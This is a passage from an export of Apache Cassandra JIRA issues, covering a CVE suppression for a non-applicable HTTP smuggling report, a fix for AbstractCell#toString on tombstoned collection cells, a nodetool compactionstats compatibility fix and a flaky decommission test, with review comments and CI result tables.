Similar to CASSANDRA-17633, the HTTP request smuggling vulnerabilities continue.",,bereng,jmckenzie,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,brandon.williams,,,,,,,,,,,,,,Security,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Mon Jun 27 16:51:39 UTC 2022,,,,,,,All,,,,"0|z13bx4:",9223372036854775807,,,,bereng,,,,Low,,NA,,https://github.com/apache/cassandra/commit/5ed63e0a5a01bf7709bb5adc9165ccc6e6d9a7cf,,,,,,,,,run CI,,,,,"17/Jun/22 14:09;brandon.williams;As usual, we don't use HTTP and should suppress this.

||Branch||CI||
|[3.0|https://github.com/driftx/cassandra/tree/CASSANDRA-17697-3.0]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/531/workflows/e62ec783-c759-404a-b2bb-b07ac63d966c]|
|[3.11|https://github.com/driftx/cassandra/tree/CASSANDRA-17697-3.11]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/532/workflows/1ad91b7b-9daa-408d-9d6a-892617ccfdb3]|
;;;","20/Jun/22 08:23;bereng;I can't check the actual failure on the 2 failing dtests as circle refuses to load that. But assuming you can check there's nothing weird in there +1 ltgm

Edit: Would we want to add an explanation comment to the ignored CVE's?;;;","21/Jun/22 14:48;brandon.williams;The two failing tests are CASSANDRA-17701 and CASSANDRA-17702, both have been failing for some time now.

bq. Would we want to add an explanation comment to the ignored CVE's?

There are comments in the file that basically say these aren't applicable.  Every suppression can be blamed to find a jira though, which is probably the best route to take for more detail so I don't think there's much to add in the suppression file.;;;","21/Jun/22 14:49;brandon.williams;Committed, thanks.;;;","27/Jun/22 16:51;jmckenzie;[CI Results]
Branch: 4.1, build number: 77
   butler url: https://butler.cassandra.apache.org/#/ci/upstream/compare/Cassandra-4.1/Cassandra-4.1
   jenkins url: https://ci-cassandra.apache.org/job/Cassandra-4.1/77/
   JIRA: CASSANDRA-17697
   commit url: https://gitbox.apache.org/repos/asf?p=cassandra.git;a=commit;h=5ed63e0a5a01bf7709bb5adc9165ccc6e6d9a7cf
   affected paths:
* CHANGES.txt
* .build/dependency-check-suppressions.xml

   Build Result: UNSTABLE
   Passing Tests: 46788
   Failing Tests: 13

||Test|Failures|JIRA||
|org.apache.cassandra.cql3.validation.operations.SelectTest.testIndexQueryWithCompositePartitionKey|3 of 74|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.distributed.upgrade.CompactStoragePagingTest.testPagingWithCompactStorage|5 of 74|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.distributed.test.SchemaTest.readRepairWithCompaction|20 of 74|[CASSANDRA-17641?|https://issues.apache.org/jira/browse/CASSANDRA-17641]|
|org.apache.cassandra.cql3.validation.entities.SecondaryIndexTest.testIndexOnClusteringKeyInsertExpiringColumn|5 of 74|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.distributed.upgrade.BatchUpgradeTest.batchTest|22 of 74|[CASSANDRA-17651?|https://issues.apache.org/jira/browse/CASSANDRA-17651]|
|org.apache.cassandra.cql3.validation.entities.SecondaryIndexTest.testIndexesOnComplexPrimaryKey|7 of 74|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.tools.TopPartitionsTest.testServiceTopPartitionsSingleTable|7 of 74|[CASSANDRA-17649?|https://issues.apache.org/jira/browse/CASSANDRA-17649]|
|org.apache.cassandra.net.ConnectionTest.testMessageDeliveryOnReconnect|4 of 74|[CASSANDRA-16677?|https://issues.apache.org/jira/browse/CASSANDRA-16677]|
|org.apache.cassandra.cql3.ViewComplexUpdatesTest.testUpdateWithColumnTimestampSmallerThanPkWithFlush[3]|2 of 74|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.cql3.validation.entities.SecondaryIndexTest.testCanQuerySecondaryIndex|5 of 74|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.cql3.ViewComplexTTLTest.testBaseTTLWithSameTimestampTest[3]|2 of 74|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.cql3.validation.operations.SelectTest.testTokenFctRejectsInvalidColumnCount|2 of 74|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.db.commitlog.CommitLogSegmentManagerCDCTest.testSegmentFlaggingWithNonblockingOnCreation|4 of 74|[CASSANDRA-17542?|https://issues.apache.org/jira/browse/CASSANDRA-17542]|
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix AbstractCell#toString throws MarshalException for cell in collection,CASSANDRA-17695,13450485,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,frankgh,yifanc,yifanc,16/Jun/22 21:50,16/Dec/22 21:54,13/Jul/23 08:40,30/Jun/22 01:17,4.1,4.1-beta1,,,,,Legacy/Core,,,,0,,"AbstractCell#toString is broken when calling on some cells in multi-cell collections.

With the following types are unmarshallable: [date, duration, smallint, time, tinyint].

The test to discover the unmarshallable types is
{code:java}
@Test
public void testUnmarshallableInMulticellCollection()
{
    List<CQL3Type.Native> unmarshallableTypes = new ArrayList<>();
    for (CQL3Type.Native nativeType : CQL3Type.Native.values())
    {
        ColumnMetadata c = fakeColumn(""c"", MapType.getInstance(Int32Type.instance, nativeType.getType(), true));
        BufferCell cell = BufferCell.tombstone(c, 0, 4, CellPath.create(ByteBufferUtil.bytes(4)));
        try
        {
            cell.toString();
        }
        catch (MarshalException m)
        {
            unmarshallableTypes.add(nativeType);
        }
    }
    System.out.println(""Unmarshallable types: "" + unmarshallableTypes);
}
{code}
At the first sight, the error is caused by trying to deserialize the values of the tombstone cells. The values are empty, hence the failure.",,frankgh,jmckenzie,maedhroz,yifanc,,,,,,,,,,,"frankgh opened a new pull request, #1695:
URL: https://github.com/apache/cassandra/pull/1695

   Calling `AbstractCell#toString` on a tombstoned multi-cell `CollectionType` for the `date`, `duration`,
   `smallint`, `time`, and `tinyint` types produces a `MarshalException`. The root cause of the issue
   occurs when `AbstractCell#toString` in turns calls `AbstractType#getString(V value, ValueAccessor<V> acccesor)`.
   The `TypeSerializer` performs validation of the value. However, because this value is tombstoned
   the size of the value is 0 which doesn't match the type value. The failed check throws a `MarshalException`.
   In this commit, we check whether the Cell is tombstoned and add the ""<tombstone>"" string to the
   output of the `AbstractCell#toString` method for tombstoned cells.


;17/Jun/22 15:56;githubbot;600","yifan-c commented on code in PR #1695:
URL: https://github.com/apache/cassandra/pull/1695#discussion_r904476793


##########
test/unit/org/apache/cassandra/db/CellTest.java:
##########
@@ -103,6 +105,26 @@ public void testConflictingTypeEquality()
         }
     }
 
+    @Test
+    public void testUnmarshallableInMulticellCollection()
+    {
+        List<CQL3Type.Native> unmarshallableTypes = new ArrayList<>();
+        for (CQL3Type.Native nativeType : CQL3Type.Native.values())
+        {
+            ColumnMetadata c = fakeColumn(""c"", MapType.getInstance(Int32Type.instance, nativeType.getType(), true));
+            BufferCell cell = BufferCell.tombstone(c, 0, 4, CellPath.create(ByteBufferUtil.bytes(4)));
+            try
+            {
+                Assert.assertTrue(cell.toString().contains(""tombstone""));

Review Comment:
   nit: would be better if asserting on the format, instead of just contains. 



;23/Jun/22 03:06;githubbot;600","frankgh commented on code in PR #1695:
URL: https://github.com/apache/cassandra/pull/1695#discussion_r906155687


##########
test/unit/org/apache/cassandra/db/CellTest.java:
##########
@@ -103,6 +105,26 @@ public void testConflictingTypeEquality()
         }
     }
 
+    @Test
+    public void testUnmarshallableInMulticellCollection()
+    {
+        List<CQL3Type.Native> unmarshallableTypes = new ArrayList<>();
+        for (CQL3Type.Native nativeType : CQL3Type.Native.values())
+        {
+            ColumnMetadata c = fakeColumn(""c"", MapType.getInstance(Int32Type.instance, nativeType.getType(), true));
+            BufferCell cell = BufferCell.tombstone(c, 0, 4, CellPath.create(ByteBufferUtil.bytes(4)));
+            try
+            {
+                Assert.assertTrue(cell.toString().contains(""tombstone""));

Review Comment:
   thanks for the review, @yifan-c. I pushed a new commit addressing your feedback



;24/Jun/22 15:07;githubbot;600","maedhroz commented on code in PR #1695:
URL: https://github.com/apache/cassandra/pull/1695#discussion_r908772861


##########
test/unit/org/apache/cassandra/db/CellTest.java:
##########
@@ -103,6 +105,26 @@ public void testConflictingTypeEquality()
         }
     }
 
+    @Test
+    public void testUnmarshallableInMulticellCollection()
+    {
+        List<CQL3Type.Native> unmarshallableTypes = new ArrayList<>();
+        for (CQL3Type.Native nativeType : CQL3Type.Native.values())
+        {
+            ColumnMetadata c = fakeColumn(""c"", MapType.getInstance(Int32Type.instance, nativeType.getType(), true));
+            BufferCell cell = BufferCell.tombstone(c, 0, 4, CellPath.create(ByteBufferUtil.bytes(4)));
+            try
+            {
+                Assert.assertEquals(""expected #toString failed for type "" + nativeType, ""[c[4]=<tombstone> ts=0 ldt=4]"", cell.toString());
+            }
+            catch (MarshalException m)
+            {
+                unmarshallableTypes.add(nativeType);
+            }
+        }
+        Assert.assertTrue(unmarshallableTypes.isEmpty());

Review Comment:
   nit: Might get a better error message with AssertJ
   
   ```
   assertThat(unmarshallableTypes).isEmpty();
   ```



;28/Jun/22 17:39;githubbot;600","frankgh commented on code in PR #1695:
URL: https://github.com/apache/cassandra/pull/1695#discussion_r908821077


##########
test/unit/org/apache/cassandra/db/CellTest.java:
##########
@@ -103,6 +105,26 @@ public void testConflictingTypeEquality()
         }
     }
 
+    @Test
+    public void testUnmarshallableInMulticellCollection()
+    {
+        List<CQL3Type.Native> unmarshallableTypes = new ArrayList<>();
+        for (CQL3Type.Native nativeType : CQL3Type.Native.values())
+        {
+            ColumnMetadata c = fakeColumn(""c"", MapType.getInstance(Int32Type.instance, nativeType.getType(), true));
+            BufferCell cell = BufferCell.tombstone(c, 0, 4, CellPath.create(ByteBufferUtil.bytes(4)));
+            try
+            {
+                Assert.assertEquals(""expected #toString failed for type "" + nativeType, ""[c[4]=<tombstone> ts=0 ldt=4]"", cell.toString());
+            }
+            catch (MarshalException m)
+            {
+                unmarshallableTypes.add(nativeType);
+            }
+        }
+        Assert.assertTrue(unmarshallableTypes.isEmpty());

Review Comment:
   yeah , I thought about moving to AssertJ, but this class is already using `org.junit.Assert` so decided against it



;28/Jun/22 18:39;githubbot;600","frankgh opened a new pull request, #1705:
URL: https://github.com/apache/cassandra/pull/1705

   Calling `AbstractCell#toString` on a tombstoned multi-cell `CollectionType` for the `date`, `duration`,
   `smallint`, `time`, and `tinyint` types produces a `MarshalException`. The root cause of the issue
   occurs when `AbstractCell#toString` in turns calls `AbstractType#getString(V value, ValueAccessor<V> acccesor)`.
   The `TypeSerializer` performs validation of the value. However, because this value is tombstoned
   the size of the value is 0 which doesn't match the type value. The failed check throws a `MarshalException`.
   In this commit, we check whether the Cell is tombstoned and add the ""<tombstone>"" string to the
   output of the `AbstractCell#toString` method for tombstoned cells.


;28/Jun/22 18:41;githubbot;600","smiklosovic closed pull request #1695: CASSANDRA-17695: Fix AbstractCell#toString for tombstoned multicell CollectionTypes
URL: https://github.com/apache/cassandra/pull/1695


;30/Jun/22 06:21;githubbot;600","frankgh commented on PR #1705:
URL: https://github.com/apache/cassandra/pull/1705#issuecomment-1171166616

   Merged via https://github.com/apache/cassandra/commit/a9725b681b948f2122f3d48b96a5c4e7403d2c39


;30/Jun/22 12:36;githubbot;600","frankgh closed pull request #1705: CASSANDRA-17695: Fix AbstractCell#toString for tombstoned multicell CollectionTypes
URL: https://github.com/apache/cassandra/pull/1705


;30/Jun/22 12:36;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,5400,,,0,5400,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,frankgh,,,,,,,,,,,,,,Degradation -> Other Exception,,,,,,,,Low Hanging Fruit,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Jul 06 18:50:21 UTC 2022,,,,,,,All,,,,"0|z13b28:",9223372036854775807,,,,maedhroz,ycai,,,Low,,3.0.0,,https://github.com/apache/cassandra/commit/a9725b681b948f2122f3d48b96a5c4e7403d2c39,,,,,,,,,Added test verifying that {{MarshalException}} no longer occurs when calling \{{AbstractCell#toString}} after the fix.,,,,,"16/Jun/22 21:56;yifanc;It is low severity and I do not believe we can hit the error with the current codebase. 

However, according to the test, the implementation need to be fix to be future proof. For example, a feature change that include the cell in the logging (which call toString implicitly) would trigger the exception. ;;;","17/Jun/22 15:59;frankgh;PR: [https://github.com/apache/cassandra/pull/1695]
CI: [https://app.circleci.com/pipelines/github/frankgh/cassandra?filter=all] ;;;","27/Jun/22 18:21;yifanc;+1 on the patch. ;;;","28/Jun/22 17:37;maedhroz;+1

Just needs a 4.1 patch.;;;","28/Jun/22 18:43;frankgh;Thanks for the review [~maedhroz] . Here's the 4.1 patch:

PR: [https://github.com/apache/cassandra/pull/1705/files]
CI: [https://app.circleci.com/pipelines/github/frankgh/cassandra?branch=CASSANDRA-17695-4.1&filter=all];;;","29/Jun/22 18:37;yifanc;Starting commit

CI Results:
||Branch||Source||Circle CI||
|cassandra-4.1|[branch|https://github.com/yifan-c/cassandra/tree/commit_remote_branch/CASSANDRA-17695-cassandra-4.1-607FC054-BE7C-499B-BDB5-A9E4DABCC8AE]|[build|https://app.circleci.com/pipelines/github/yifan-c/cassandra?branch=commit_remote_branch%2FCASSANDRA-17695-cassandra-4.1-607FC054-BE7C-499B-BDB5-A9E4DABCC8AE]|
|trunk|[branch|https://github.com/yifan-c/cassandra/tree/commit_remote_branch/CASSANDRA-17695-trunk-607FC054-BE7C-499B-BDB5-A9E4DABCC8AE]|[build|https://app.circleci.com/pipelines/github/yifan-c/cassandra?branch=commit_remote_branch%2FCASSANDRA-17695-trunk-607FC054-BE7C-499B-BDB5-A9E4DABCC8AE]|

Test failures does not look related and they have tracking JIRAs.;;;","30/Jun/22 01:17;yifanc;Committed into 4.1 as [a9725b681|https://github.com/apache/cassandra/commit/a9725b681b948f2122f3d48b96a5c4e7403d2c39] and merged up to trunk. ;;;","06/Jul/22 18:50;jmckenzie;[ASF CI Results]
Branch: 4.1, build number: 84
butler url: [https://butler.cassandra.apache.org/#/ci/upstream/compare/Cassandra-4.1/Cassandra-4.1]
jenkins url: [https://ci-cassandra.apache.org/job/Cassandra-4.1/84/]
JIRA: CASSANDRA-17695
commit url: [https://gitbox.apache.org/repos/asf?p=cassandra.git;a=commit;h=a9725b681b948f2122f3d48b96a5c4e7403d2c39]
affected paths:
 * src/java/org/apache/cassandra/db/rows/AbstractCell.java
 * CHANGES.txt
 * test/unit/org/apache/cassandra/db/CellTest.java

Build Result: UNSTABLE
Passing Tests: 48211
Failing Tests: 26
||Test|Failures|JIRA|
|org.apache.cassandra.cql3.validation.entities.SecondaryIndexTest.testSelectOnMultiIndexOnCollectionsWithNull|11 of 81|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.distributed.upgrade.MixedModeAvailabilityV30Test.testAvailability|13 of 81|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|dtest-offheap.auth_test.TestAuth.test_system_auth_ks_is_alterable|3 of 81|[Multiple JIRAs found|https://issues.apache.org/jira/issues/?jql=project%20%3D%20CASSANDRA%20and%20resolution%20%3D%20unresolved%20and%20summary%20~%20%22*TestAuth*%22]|
|org.apache.cassandra.cql3.validation.operations.SelectTest.containsFilteringForClusteringKeys|2 of 81|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|dtest.repair_tests.incremental_repair_test.TestIncRepair.test_multiple_repair|4 of 81|CASSANDRA-11268?|
|org.apache.cassandra.net.ProxyHandlerConnectionsTest.suddenDisconnect-compression|3 of 81|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|dtest-upgrade.upgrade_tests.upgrade_through_versions_test.TestUpgrade_current_3_0_x_To_indev_4_1_x.test_bootstrap|1 of 81|[Multiple JIRAs found|https://issues.apache.org/jira/issues/?jql=project%20%3D%20CASSANDRA%20and%20resolution%20%3D%20unresolved%20and%20summary%20~%20%22*TestUpgrade*%22]|
|org.apache.cassandra.cql3.validation.entities.SecondaryIndexTest.testIndexOnRegularColumnInsertExpiringColumnWithFlush|9 of 81|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.cql3.validation.entities.TupleTypeTest.testNestedTuple|12 of 81|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.distributed.test.SchemaTest.readRepair|21 of 81|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|dtest.rebuild_test.TestRebuild.test_resumable_rebuild|1 of 81|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.cql3.validation.entities.SecondaryIndexTest.testIndexesOnNonStaticColumnsWhereSchemaIncludesStaticColumns|2 of 81|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.net.ConnectionTest.testTimeout-cdc|1 of 81|CASSANDRA-16677?|
|org.apache.cassandra.distributed.test.CASTest.testConflictingWritesWithStaleRingInformation|21 of 81|CASSANDRA-17461?|
|org.apache.cassandra.distributed.upgrade.CompactStoragePagingTest.testPagingWithCompactStorage|7 of 81|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.distributed.test.RepairErrorsTest.testRemoteStreamFailure|3 of 81|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.cql3.ViewComplexTTLTest.testUpdateColumnInViewPKWithTTLWithFlush[3]|19 of 81|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.utils.concurrent.SemaphoreTest.testUnfair|1 of 81|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.net.ProxyHandlerConnectionsTest.testExpireSome-compression|7 of 81|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.distributed.test.SchemaTest.readRepairWithCompaction|23 of 81|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.cql3.ViewComplexLivenessTest.testUnselectedColumnWithExpiredLivenessInfoWithoutFlush[3]|1 of 81|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.cql3.ViewComplexTTLTest.terminated successfully|5 of 81|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Address CASSANDRA-16844 and CASSANDRA-16976 breaking compatibility,CASSANDRA-17683,13448662,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,brandon.williams,dcapwell,dcapwell,07/Jun/22 00:22,19/Jan/23 15:39,13/Jul/23 08:40,29/Jun/22 15:20,4.1,4.1-beta1,,,,,Tool/nodetool,,,,0,,"Compactionstats changed the output format, which causes a breaking change in a minor release; this goes against the projects guidelines for a minor release and needs to be addressed before releasing 4.1",,adelapena,dcapwell,e.dimitrova,jmckenzie,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-16844,CASSANDRA-18139,,,,,CASSANDRA-16976,,,,,,,,,,,,,,,,,,,,0.0,brandon.williams,,,,,,,,,,,,,,Degradation -> Other Exception,,,,,,,,Low Hanging Fruit,Code Inspection,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Jul 06 18:49:06 UTC 2022,,,,,,,All,,,,"0|z12zuw:",9223372036854775807,,,,dcapwell,e.dimitrova,,,Critical,,4.1-alpha,,https://github.com/apache/cassandra/commit/b75d56fd387a3af2706f75c0536cf112fdf6b788,,,,,,,,,run CI,,,,,"07/Jun/22 00:24;dcapwell;checking what breaks, will make sure green then ask for review;;;","13/Jun/22 18:33;dcapwell;renaming to reflect the actual issue...;;;","13/Jun/22 18:34;dcapwell;Having most of the conversation in CASSANDRA-16844, but using this ticket to block release;;;","23/Jun/22 22:11;brandon.williams;Since CASSANDRA-16976 brought parity with vtables (and was after CASSANDRA-16844) I moved its new output behind a --vtable flag and made the old output the default. Also added tests for the old format to bring it up to par post-16844 which added some that cover the 'vtable' format.

||Branch||CI||
|[4.1|https://github.com/driftx/cassandra/tree/CASSANDRA-17683-4.1]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/534/workflows/979bddc6-47c9-4da9-b7cd-629a3226ebb5], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/534/workflows/36f4b299-23ea-4a25-a001-f0484dd14f3c]|
|[trunk|https://github.com/driftx/cassandra/tree/CASSANDRA-17683-trunk]|[j8|https://app.circleci.com/pipelines/github/driftx/cassandra/533/workflows/7249b765-8300-4159-9b6a-f43438596e0b], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/533/workflows/3bbb5813-fd9f-4b25-b9eb-3c468f62d601]|;;;","27/Jun/22 20:22;e.dimitrova;CI doesn't seem to show any new failures.

I verified testCompactionStats before and after the three patches and the output seems the same. 

Overall, +1, just a few formatting comments which can be addressed on commit. We need NEWS.txt entry for the new flag. Please feel free to address this on commit

[~dcapwell] as you've been the original reporter and you spent some time on the fix, can you also check the suggested patch, please? Thanks in advance

(I went through the 4.1 patch only as I assume the trunk version is the same);;;","28/Jun/22 22:21;dcapwell;Change LGTM +1

Thanks for this!;;;","29/Jun/22 15:20;brandon.williams;bq. I assume the trunk version is the same

Correct, it's a clean merge.

Thanks for the reviews, committed w/nits corrected and NEWS added.;;;","06/Jul/22 18:49;jmckenzie;[CI Results]
Branch: 4.1, build number: 83
   butler url: https://butler.cassandra.apache.org/#/ci/upstream/compare/Cassandra-4.1/Cassandra-4.1
   jenkins url: https://ci-cassandra.apache.org/job/Cassandra-4.1/83/
   JIRA: CASSANDRA-17683
   commit url: https://gitbox.apache.org/repos/asf?p=cassandra.git;a=commit;h=b75d56fd387a3af2706f75c0536cf112fdf6b788
   affected paths:
* src/java/org/apache/cassandra/tools/nodetool/CompactionStats.java
* NEWS.txt
* CHANGES.txt
* test/unit/org/apache/cassandra/tools/nodetool/CompactionStatsTest.java

   Build Result: UNSTABLE
   Passing Tests: 47696
   Failing Tests: 13

||Test|Failures|JIRA||
|org.apache.cassandra.cql3.validation.entities.SecondaryIndexTest.testIndexOnNonFrozenCollectionOfFrozenUDT|4 of 80|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.cql3.ViewTest.terminated successfully|1 of 80|[Multiple JIRAs found|https://issues.apache.org/jira/issues/?jql=project%20%3D%20CASSANDRA%20and%20resolution%20%3D%20unresolved%20and%20summary%20~%20""*ViewTest*""]
|org.apache.cassandra.cql3.ViewFilteringClustering1Test.testClusteringKeySliceRestrictions[3]|13 of 80|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.net.ConnectionTest.testTimeout|2 of 80|[CASSANDRA-16677?|https://issues.apache.org/jira/browse/CASSANDRA-16677]|
|org.apache.cassandra.cql3.validation.entities.SecondaryIndexTest.testWriteOnlyIndex|7 of 80|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.distributed.test.SchemaTest.readRepair|20 of 80|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.hints.HintsServiceTest.testPageSeek|2 of 80|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.cql3.validation.entities.TupleTypeTest.testNestedTuple|11 of 80|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.cql3.ViewComplexTTLTest.testUpdateColumnInViewPKWithTTLWithFlush[3]|18 of 80|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.cql3.validation.entities.SecondaryIndexTest.testSelectOnMultiIndexOnCollectionsWithNull|10 of 80|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.cql3.validation.entities.SecondaryIndexTest.droppingIndexInvalidatesPreparedStatements|4 of 80|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix flaky topology_test.py::TestTopology::test_simple_decommission,CASSANDRA-17680,13448232,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,brandon.williams,e.dimitrova,e.dimitrova,02/Jun/22 22:32,05/Oct/22 22:22,13/Jul/23 08:40,16/Jun/22 11:08,4.0.5,4.1,4.1-beta1,,,,CI,,,,0,,"[https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=test_simple_decommission-4.1&filter=all]

Reproduced in 4.1 but it might exist also in other branches, to be tested. I don't see it in Butler but sounds like something good to be checked. 

 
{code:java}
test teardown failure Unexpected error found in node logs (see stdout for full details). Errors: [[node2] 'ERROR [OptionalTasks:1] 2022-06-02 21:19:09,514 JVMStabilityInspector.java:68 - Exception in thread Thread[OptionalTasks:1,5,OptionalTasks]\njava.lang.AssertionError: Unable to get tokens for /127.0.0.2:7000; it is not a member\n\tat org.apache.cassandra.locator.TokenMetadata.getTokens(TokenMetadata.java:604)\n\tat org.apache.cassandra.service.StorageService.getLocalPrimaryRangeForEndpoint(StorageService.java:4543)\n\tat org.apache.cassandra.service.StorageService.getLocalPrimaryRange(StorageService.java:4535)\n\tat org.apache.cassandra.db.SizeEstimatesRecorder.run(SizeEstimatesRecorder.java:91)\n\tat org.apache.cassandra.concurrent.ExecutionFailure$1.run(ExecutionFailure.java:124)\n\tat java.base/java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:515)\n\tat java.base/java.util.concurrent.FutureTask.runAndReset(FutureTask.java:305)\n\tat java.base/java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.run(ScheduledThreadPoolExecutor.java:305)\n\tat java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)\n\tat java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)\n\tat io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)\n\tat java.base/java.lang.Thread.run(Thread.java:829)']{code}",,adelapena,brandon.williams,e.dimitrova,jmckenzie,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,brandon.williams,,,,,,,,,,,,,,Correctness -> Test 